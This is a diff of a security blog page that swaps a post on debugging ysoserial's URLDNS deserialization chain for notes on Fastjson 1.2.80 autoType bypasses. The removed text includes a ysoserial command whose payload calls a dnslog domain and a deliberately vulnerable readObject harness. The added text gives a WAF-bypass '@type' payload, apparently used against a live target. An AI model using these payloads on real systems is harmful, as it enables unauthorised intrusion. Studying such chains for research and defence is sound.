@@ -5,13 +5,12 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>URLDNS调试那些小事 - RainSec</title>
+    <title>Fastjson 1.2.80调试小记 - RainSec</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="RainSec,"> 
-    <meta name="description" content="致力于云原生安全和自动化渗透测试的研究与分享,URLDNS调试那些小事近期在看javaweb相关的知识，ysoserial作为反序列化利用链的神器，想稍微利用它来调试一个简单的urldns利用链，进而了解这个工具。
-ysoserial链接：下载,"> 
+    <meta name="description" content="致力于云原生安全和自动化渗透测试的研究与分享,fastjson 1.2.80 调试小记先膜一下浅蓝师傅，在1.2.80的绕过中主要是通过setter方法参数 、public field 、构造方法的参数 类加白 ，再用加白的类来构造gadget,"> 
     <meta name="author" content="RainSec"> 
     <link rel="alternative" href="atom.xml" title="RainSec" type="application/atom+xml"> 
     <link rel="icon" href="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg"> 
@@ -77,7 +76,7 @@ ysoserial链接：下载,">
     <div class="navigation animated fadeIn fast delay-1s">
         <img id="home-icon" class="icon-home" src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg" alt="" data-url="https://rainsec.cn">
         <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
-        <h3 class="subtitle">URLDNS调试那些小事</h3>
+        <h3 class="subtitle">Fastjson 1.2.80调试小记</h3>
         <div class="social">
             <!--        <div class="like-icon">-->
             <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
@@ -102,7 +101,7 @@ ysoserial链接：下载,">
             animation-duration: 1.2s;
             background-image: 
                 radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
-                url('https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/what-is-dns.3wivpbhx9do.png') ">
+                url('https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220930/image.5hsjeydq0cg0.png') ">
         </div>
         <div class="else">
             <p class="animated fadeInDown">
@@ -110,22 +109,22 @@ ysoserial链接：下载,">
                 <a href="/categories/渗透测试"><b>「
                     </b>渗透测试<b> 」</b></a>
                 
-                March 26, 2022
+                September 27, 2022
             </p>
-            <h3 class="post-title animated fadeInDown"><a href="/post/URLDNS%E8%B0%83%E8%AF%95%E9%82%A3%E4%BA%9B%E5%B0%8F%E4%BA%8B.html" title="URLDNS调试那些小事" class="">URLDNS调试那些小事</a>
+            <h3 class="post-title animated fadeInDown"><a href="/post/fastjson%201.2.80%E8%B0%83%E8%AF%95%E5%B0%8F%E8%AE%B0.html" title="Fastjson 1.2.80调试小记" class="">Fastjson 1.2.80调试小记</a>
             </h3>
             
             <p class="post-count animated fadeInDown">
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    4.4k
+                    1.5k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    4 mins.
+                    1 mins.
                 </span>
                 
                 
@@ -137,6 +136,8 @@ ysoserial链接：下载,">
                 
             </p>
             
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
             
         </div>
     </div>
@@ -157,75 +158,17 @@ ysoserial链接：下载,">
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <h1 id="URLDNS调试那些小事"><a href="#URLDNS调试那些小事" class="headerlink" title="URLDNS调试那些小事"></a>URLDNS调试那些小事</h1><p>近期在看javaweb相关的知识，ysoserial作为反序列化利用链的神器，想稍微利用它来调试一个简单的urldns利用链，进而了解这个工具。</p>
-<h4 id="ysoserial链接："><a href="#ysoserial链接：" class="headerlink" title="ysoserial链接："></a>ysoserial链接：</h4><pre><code class="txt">下载地址: https://github.com/frohoff/ysoserial
-这里用jdk1.8来编译
+            <h1 id="fastjson-1-2-80-调试小记"><a href="#fastjson-1-2-80-调试小记" class="headerlink" title="fastjson 1.2.80 调试小记"></a>fastjson 1.2.80 调试小记</h1><p>先膜一下浅蓝师傅，在1.2.80的绕过中主要是通过setter方法参数 、public field 、构造方法的参数 类加白 ，再用加白的类来构造gadget。<br>笔者在复现时发现，不同的加白方法适用于不同的版本范围，遂有了这篇调试小记。</p>
+<h2 id="1-2-73-1-2-80"><a href="#1-2-73-1-2-80" class="headerlink" title="1.2.73-1.2.80"></a>1.2.73-1.2.80</h2><p>setter方法参数 &amp; public field 加白</p>
+<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220930/1.46ttatd6ng20.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/compare/1.2.72...1.2.73">https://github.com/alibaba/fastjson/compare/1.2.72...1.2.73</a><br><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220930/2.2u2huxydnh20.jpg"></p>
+<h2 id="1-2-76-1-2-80"><a href="#1-2-76-1-2-80" class="headerlink" title="1.2.76-1.2.80"></a>1.2.76-1.2.80</h2><p>构造方法的参数加白</p>
+<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220930/3.5kl2k3mnfyg0.jpg"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/compare/1.2.75...1.2.76">https://github.com/alibaba/fastjson/compare/1.2.75...1.2.76</a><br><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220930/4.o9vu7t6mkg0.jpg"></p>
+<p>poc来自于 <a target="_blank" rel="noopener" href="https://github.com/hosch3n/FastjsonVulns">https://github.com/hosch3n/FastjsonVulns</a><br>同时感谢这位师傅为笔者指出 75到76的代码变化</p>
+<p>最后再分享一个浅蓝师傅说的绕waf 方式 ，笔者刚用这种方式绕waf成功打入核心，并且此方法适用的版本较广，低版本的fastjson也可以用</p>
+<pre><code>{'@type':xjava.lang.Class"}
 </code></pre>
-<h4 id="编译ysoserial"><a href="#编译ysoserial" class="headerlink" title="编译ysoserial"></a>编译ysoserial</h4><p>用JIdea打开导入，会自动导入依赖，导入以后可能还会出现pom.xml红色表示找不到对应依赖的情况，这时可以进入依赖文件夹，可能是用于多个版本jar下载到了其他版本，删除版本然后，再重下载即可（俺在这里卡了好久）。</p>
-<p>下载好后进入GeneratePayload这个类</p>
-<p>进行run，若出现报错可能对应的jar包的版本不对，删除jar包重新下载。</p>
-<p>若运行成功后</p>
-<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-1.png" alt="image-20220319164133435"></p>
-<p>按下蓝色小闪电，然后package进行编译打包。</p>
-<p>target目录下会显示编译好的jar包。</p>
-<h4 id="漏洞搭建"><a href="#漏洞搭建" class="headerlink" title="漏洞搭建"></a>漏洞搭建</h4><p>建立maven项目：</p>
-<pre><code class="java">import java.io.FileInputStream;
-import java.io.ObjectInputStream;
-
-public class bug {
-    public static void main(String[] args) throws Exception {
-        FileInputStream inputStream = new FileInputStream("poc.ser");
-        ObjectInputStream oi = new ObjectInputStream(inputStream);
-        oi.readObject();
-        oi.close();
-        System.out.println("反序列化完成");
-
-    }
-}
-</code></pre>
-<p>ps：漏洞环境不太准确，只是把序列化文件读进去，然后进行反序列化而已。</p>
-<p>生成恶意poc：</p>
-<p>在<a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
-<p>获得临时域名：0dt3fc.dnslog.cn</p>
-<p> java -jar .\ysoserial-0.0.5-all.jar URLDNS “<a target="_blank" rel="noopener" href="http://0dt3fc.dnslog.cn&quot;/">http://0dt3fc.dnslog.cn"</a> &gt; poc.ser</p>
-<p>将poc.ser放在漏洞项目根目录运行即可。</p>
-<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-2.png" alt="image-20220319165349429"></p>
-<p>注：这里有一个坑点，要是以powershell去生成poc文件会执行报错，需cmd，可参考：<br><a target="_blank" rel="noopener" href="https://gitter.im/frohoff/ysoserial/archives/2017/09/18">https://gitter.im/frohoff/ysoserial/archives/2017/09/18</a></p>
-<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>大致原理是java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出 DNS 请求，常用作无回显情况下验证java反序列漏洞的情况（俺没碰见过，可能是太菜了，或者运气不好哦）。</p>
-<p>在URLDNS.java下，作者写了如下利用链：</p>
-<pre><code> *   Gadget Chain:
- *     HashMap.readObject()
- *       HashMap.putVal()
- *         HashMap.hash()
- *           URL.hashCode()
- *
-</code></pre>
-<p>在刚开始会new  HashMap()，</p>
-<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-3.png" alt="image-20220319171527663"></p>
-<p>接下来会调用会调用putVal方法，putVal作用在于HashMap放入键值，这里调用了hash方法来处理key</p>
-<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-4.png" alt="image-20220319172033597"></p>
-<p>值得关注key.hashCode()方法，</p>
-<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-5.png" alt="image-20220319172118524"></p>
-<p>当hashcode==-1时会执行hashCode = handler.hashCode(this);（默认值为-1所以这里不用太在意）</p>
-<p>这里调用getHostAddress</p>
-<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-6.png" alt="image-20220319172245170"></p>
-<p>他会进行dns的查询。</p>
-<p>然后就是一些细节：</p>
-<p>在Hashmap的readObject</p>
-<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-7.png" alt="image-20220319172426593"></p>
-<p>key是从readObject得到的，说明key应该在writeObject被写入了。</p>
-<p>WriteObject最后会调用到internalWriteEntries(s)。</p>
-<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-8.png" alt="image-20220319172535442"></p>
-<p>从中可看出，key和value都来自table，即HashMap中table的值。</p>
-<p>要修改table一般会调用HashMap的put方法，从而调用putVal，这样就会造成dns请求，会和目标机器的混淆。</p>
-<p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/image-9.png" alt="img"></p>
-<p>这里ysoserial 继承抽象类SilentURLStreamHandler类，重写了openConnection和getHostAddress，</p>
-<p>可以直接返回NULL，不会有后续的操作，从而不会dns请求。</p>
-<p>知道这些我们也可以通过反射来将poc再写一遍，网上大佬们写的很完善了，俺就不班门弄斧了。</p>
-<p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/gpy1q8/ygthda">https://www.yuque.com/pmiaowu/gpy1q8/ygthda</a></p>
-<p><a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1711619506108128533&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1711619506108128533&amp;wfr=spider&amp;for=pc</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7157?page=5">https://xz.aliyun.com/t/7157?page=5</a></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
@@ -262,9 +205,9 @@ public class bug {
         <div class="sidebar">
             <div class="box animated fadeInRight">
                 <div class="subbox">
-                    <img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220720/KID.5419jujfw8s0.jpg" height=300 width=300></img>
-                    <p>KID</p>
-                    <span>一个懂一点web和一点二进制的网络安全纯爱战士</span>
+                    <img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220721/cop.3c6tiszrlxs0.jpg" height=300 width=300></img>
+                    <p>COP</p>
+                    <span>疯狂造轮子</span>
                     <dl>
                         
                         
@@ -292,7 +235,7 @@ public class bug {
             <div class="box sticky animated fadeInRight faster">
                 <div id="toc" class="subbox">
                     <h4>Contents</h4>
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#URLDNS%E8%B0%83%E8%AF%95%E9%82%A3%E4%BA%9B%E5%B0%8F%E4%BA%8B"><span class="toc-number">1.</span> <span class="toc-text">URLDNS调试那些小事</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson-1-2-80-%E8%B0%83%E8%AF%95%E5%B0%8F%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">fastjson 1.2.80 调试小记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-73-1-2-80"><span class="toc-number">1.1.</span> <span class="toc-text">1.2.73-1.2.80</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-76-1-2-80"><span class="toc-number">1.2.</span> <span class="toc-text">1.2.76-1.2.80</span></a></li></ol></li></ol>
                 </div>
             </div>
             
